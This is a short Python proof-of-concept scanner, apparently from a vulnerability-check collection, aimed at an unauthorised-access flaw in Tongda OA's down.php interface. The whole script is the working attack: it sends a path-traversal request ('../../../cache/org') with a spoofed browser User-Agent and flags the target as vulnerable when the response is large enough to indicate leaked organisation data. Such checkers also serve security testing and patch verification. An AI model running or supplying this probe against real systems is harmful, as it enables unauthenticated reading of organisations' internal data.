import requests
import urllib

def verify(url):
    relsult = {
        'name': '通达OA down.php接口存在未授权访问漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }

    vurl = urllib.parse.urljoin(url, "/inc/package/down.php?id=../../../cache/org")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        response_time = response.elapsed.total_seconds()
        Content_length = int(response.headers.get('Content-Length', 0))
        if response.status_code == 200 and Content_length > 1000:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult